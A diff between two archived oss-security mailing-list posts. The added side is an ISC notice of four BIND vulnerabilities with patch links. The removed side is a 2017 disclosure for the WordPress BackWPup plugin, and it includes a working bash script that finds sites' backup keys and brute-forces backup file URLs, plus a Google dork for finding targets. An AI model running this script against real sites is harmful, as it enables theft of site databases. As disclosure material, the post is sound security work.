@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3992" "Wednesday" "27" "September" "2017" "12:13:47" "-0400" "Larry W. Cashdollar" "larry0@me.com" "<A9D8E9DF-36AC-4F46-BAF1-0C6E002E0D71@me.com>" "93" "[oss-security] Vulnerability in Wordpress Plugin backwpup v3.4.1 possible brute forcing of backup file download" nil nil nil "9" "2017092716:13:47" "[oss-security] Vulnerability in Wordpress Plugin backwpup v3.4.1 possible brute forcing of backup file download" (number mark "U       larry0@me.co Sep 27   93/3992  " thread-indent "\"[oss-security] Vulnerability in Wordpress Plugin backwpup v3.4.1 possible brute forcing of backup file download\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1202" "Wednesday" "16" "March" "2022" "14:51:01" "-0500" "Everett B. Fulton" "ebf@isc.org" nil "32" "[oss-security] Four vulnerabilities disclosed in BIND (CVE-2021-25220, CVE-2022-0396, CVE-2022-0635 and CVE-2022-0667)" nil nil nil "3" nil nil (number mark "U       ebf@isc.org  Mar 16   32/1202  " thread-indent "\"[oss-security] Four vulnerabilities disclosed in BIND (CVE-2021-25220, CVE-2022-0396, CVE-2022-0635 and CVE-2022-0667)\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Four vulnerabilities disclosed in BIND (CVE-2021-25220, CVE-2022-0396, CVE-2022-0635 and CVE-2022-0667)" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 7648 invoked by uid 550); 27 Sep 2017 16:14:11 -0000
+Received: (qmail 13756 invoked by uid 550); 16 Mar 2022 19:55:04 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,123 +12,64 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 7630 invoked from network); 27 Sep 2017 16:14:10 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=me.com; s=04042017;
-	t=1506528835; bh=BVe87Lv2NDXKiTDeBtHTga3+JCR9NcynepiVan8WWqk=;
-	h=From:Content-type:MIME-version:Subject:Message-id:Date:To;
-	b=3/JSNntZcHvR//XVxNoy5+zKlJGnkH9JzX4sDUScX4vpXORLy3FomOWICGJfl1jpI
- nOjwINh9xUyZ50+gJy59eyWDaK8Yao/aAf3eI4Yb+haoApZdiAkRk6jEyB1M1SPKGU
- iTVKKSX0NOF3eH6jy6dddpV5WcfIEqhUuxWYNLa9S6rSlzItfdegK2ls+1J3NusMnA
- 1ksRhdQU9Ga8qHYAIRXbNxGXMwYV+At+RSB1olQ967Kcn+3BZhKnx5XY0lUivf/C8H
- T8v6ImD2AQaQRGjK4tnbsfzvfl9X4RUqb+yDJdnbRWxlnnyALUvVJuqBflpT/JGSS0
- DL+tauXf0z7hw==
-X-Proofpoint-Virus-Version: vendor=fsecure engine=2.50.10432:,,
- definitions=2017-09-27_04:,, signatures=0
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 spamscore=0
- clxscore=1015 suspectscore=0 malwarescore=0 phishscore=0 adultscore=0
- bulkscore=0 classifier=spam adjust=0 reason=mlx scancount=1
- engine=8.0.1-1707230000 definitions=main-1709270226
-From: "Larry W. Cashdollar" <larry0@me.com>
-Content-type: text/plain; charset=utf-8
-Content-transfer-encoding: quoted-printable
-MIME-version: 1.0 (Mac OS X Mail 10.3 \(3273\))
-Message-id: <A9D8E9DF-36AC-4F46-BAF1-0C6E002E0D71@me.com>
-Date: Wed, 27 Sep 2017 12:13:47 -0400
-To: Open Source Security <oss-security@lists.openwall.com>
-X-Mailer: Apple Mail (2.3273)
-Subject: [oss-security] Vulnerability in Wordpress Plugin backwpup v3.4.1 possible brute
- forcing of backup file download
+Received: (qmail 11824 invoked from network); 16 Mar 2022 19:51:16 -0000
+DKIM-Filter: OpenDKIM Filter v2.10.3 mx.pao1.isc.org 3164E3AB026
+DKIM-Signature: v=1; a=rsa-sha256; c=simple/simple; d=isc.org; s=ostpay;
+	t=1647460264; bh=SlJubT0p53wK/+AMKFsVc21DHH+QINo+dC5M+/pifvY=;
+	h=Date:To:From:Subject;
+	b=FO9EhMoOSBvGC5K//EZiuJyWV1JBpWEuV0gnO3MPZ0XqJoNO+uv1MP7RKl2XLMPAH
+	 C0s8+HF1bhXkhBF6kaiSHQFRtQlMy+odn28c3xE7Alj0wxU9zeD7aVWIsk7noUwtLs
+	 FT41Tq4v8dzxHgR3fJuBpYw5zuxm5GMoyRFc9h7I=
+DKIM-Filter: OpenDKIM Filter v2.10.3 zimbrang.isc.org 1CACD10E9E63
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=isc.org;
+	s=05DFB016-56A2-11EB-AEC0-15368D323330; t=1647460248;
+	bh=7uum2WbPmZviuclbBomc24ha+PPm3WAgWL3WOBG7Mz0=;
+	h=Message-ID:Date:MIME-Version:To:From;
+	b=gMjNvIC/ihh98Gw4OApAY7b6sibqFWOtVeLHaPmpHq6Vsc5nSMLzF45b8HbX6Lrgo
+	 ZY4VybQbMuXlC8zUMwxsuXoGVUn9RKu+axir6WWuLVz7HTXx6xHtojVNwBzVQcTTxp
+	 7NpwLm0SjnRUUxdtNBTfuKLaRY0w9OtWhMplQeds=
+Message-ID: <c4f4fbb4-04fb-a4e5-0aba-d18533ddaaa9@isc.org>
+Date: Wed, 16 Mar 2022 14:51:01 -0500
+MIME-Version: 1.0
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101
+ Thunderbird/91.6.1
+Content-Language: en-US
+To: oss-security@lists.openwall.com
+From: "Everett B. Fulton" <ebf@isc.org>
+Content-Type: text/plain; charset=UTF-8; format=flowed
+Content-Transfer-Encoding: 7bit
+Subject: [oss-security] Four vulnerabilities disclosed in BIND (CVE-2021-25220,
+ CVE-2022-0396, CVE-2022-0635 and CVE-2022-0667)
 
-Title: Vulnerability in Wordpress Plugin backwpup v3.4.1 possible brute for=
-cing of backup file download
-Author: Larry W. Cashdollar, @_larry0
-Date: 2017-09-08
-CVE-ID:[CVE-2017-2551]
-Download Site: https://wordpress.org/plugins/backwpup
-Vendor: Inpsyde
-Vendor Notified: 2017-09-08, fixed v3.4.2
-Vendor Contact: plugins@wordpress.org
-Advisory: http://www.vapidlabs.com/advisory.php?v=3D201
-Description: "The backup plugin BackWPup can be used to save your complete =
-installation including /wp-content/ and push them to an external Backup Ser=
-vice, like Dropbox, S3, FTP and many more."
-Vulnerability:
-There is a weakness in the way backwpup creates and stores the backup files=
- it generates.  It creates a random string to obscure the location, but
-it uses that same string to create the storage directory under wp-content/u=
-ploads/ which in most installations of WordPress allows file listings.
+On March 16 2022, we (Internet Systems Consortium) disclosed four
+vulnerabilities affecting our BIND 9 software:
 
-Someone looking to steal a copy of the database could simply list the direc=
-tories in /uploads to find that random string and then brute force the loca=
-tion of the file as its structure is just a date and time stamp.  It would =
-take a Maximum of 86400 tries to guess if a backup is available for that da=
-y.=20=20
-Filename format:=20
-backwpup_ RANDOMSTRINGBACKUPNUMBER_%Y-%m-%d_%H-%i-%s
+   CVE-2021-25220: DNS forwarders - cache poisoning vulnerability
+   https://kb.isc.org/docs/CVE-2021-25220
 
-Default settings are:
+   CVE-2022-0396: DoS from specifically crafted TCP packets
+   https://kb.isc.org/docs/cve-2022-0396
 
-%d =3D Two digit day of the month, with leading zeros
-%m =3D Day of the month, with leading zeros
-%Y =3D Four digit representation for the year
-%H =3D Hour in 24-hour format, with leading zeros
-%i =3D Two digit representation of the minute
-%s =3D Two digit representation of the second
+   CVE-2022-0635: DNAME insist with synth-from-dnssec enabled
+   https://kb.isc.org/docs/cve-2022-0635
 
-https://wordpress.org/plugins/backwpup
+   CVE-2022-0667: Assertion failure on delayed DS lookup
+   https://kb.isc.org/docs/cve-2022-0667
 
+New versions of BIND are available from https://www.isc.org/downloads
 
-Exploit Code:
-	=E2=80=A2 #!/bin/bash
-	=E2=80=A2 #Exploit for Wordpress Plugin BackWPup v3.4.1
-	=E2=80=A2 #Download https://wordpress.org/plugins/backwpup
-	=E2=80=A2 #CWE-552: Files or Directories Accessible to External Parties
-	=E2=80=A2 #CVE-ID: CVE-2017-2551
-	=E2=80=A2 #Google Dork: inurl:wp-content/uploads/backwpup
-	=E2=80=A2=20=20
-	=E2=80=A2=20=20
-	=E2=80=A2 #Add banner about vulnerability
-	=E2=80=A2=20=20
-	=E2=80=A2 KEY=3D`curl --silent http://$1/wp-content/uploads/|html2text |gr=
-ep backups | awk -F- '{print $2}'`
-	=E2=80=A2=20=20
-	=E2=80=A2 #Add error checking here
-	=E2=80=A2 echo "[+] Getting Unique Key $KEY"
-	=E2=80=A2 DIR=3D"backwpup-$KEY-backups"
-	=E2=80=A2 echo "[+] Checking directory $DIR"
-	=E2=80=A2 WPATH=3D"$DIR/backwpup_$KEY"
-	=E2=80=A2 echo "[+] Creating Path: $WPATH"
-	=E2=80=A2 #use date command here for the default date of current day
-	=E2=80=A2 MONTH=3D09
-	=E2=80=A2 DAY=3D07
-	=E2=80=A2 YEAR=3D2017
-	=E2=80=A2 Z=3D0
-	=E2=80=A2=20=20
-	=E2=80=A2 echo "[+] Scanning website for available backups:"
-	=E2=80=A2 for y in `seq -w 0 23`; do
-	=E2=80=A2         for x in `seq -w 0 59`; do
-	=E2=80=A2                  Y=3D`echo "scale=3D2;($Z/86000)*100"|bc`;
-	=E2=80=A2                  echo -ne "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\=
-b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b=
-\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\=
-b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b=
-\b\b\b\b\b\b\b\b\b\b\b\b$CWPATH $Y%"
-	=E2=80=A2         for z in `seq -w 0 59`; do
-	=E2=80=A2                  Z=3D$(( $Z + 1 ));
-	=E2=80=A2                  CWPATH=3D"http://$1/wp-content/uploads/$WPATH"0=
-1"_"$YEAR"-"$MONTH"-"$DAY"_"$y"-"$x"-"$z".zip";
-	=E2=80=A2                  RESULT=3D`curl -s --head $CWPATH|grep 200`;
-	=E2=80=A2                 if [ -n "$RESULT" ]; then
-	=E2=80=A2                  echo ""
-	=E2=80=A2                  echo "[+] Location $CWPATH Found";
-	=E2=80=A2                  echo "[+] Received $RESULT";
-	=E2=80=A2                  echo "Downloading......";
-	=E2=80=A2                 # wget $CWPATH
-	=E2=80=A2                   exit;
-	=E2=80=A2                 fi;
-	=E2=80=A2         done
-	=E2=80=A2         done
-	=E2=80=A2 done
-	=E2=80=A2 echo "Completed."
-Screen Shots:
-Notes: Google Dork: inurl:wp-content/uploads/backwpup=
+Operators and package maintainers who prefer to apply patches
+selectively can find individual vulnerability-specific patches in the
+"patches" subdirectory of the release directories for our three stable
+release branches (9.11. 9.16 and 9.18)
+
+   https://downloads.isc.org/isc/bind9/9.11.37/patches/
+   https://downloads.isc.org/isc/bind9/9.16.27/patches/
+   https://downloads.isc.org/isc/bind9/9.18.1/patches/
+
+With the public announcement of these vulnerabilities, the embargo
+period is ended and any updated software packages that have been
+prepared may be released.
+-- 
+Everett B. Fulton
+ISC Support
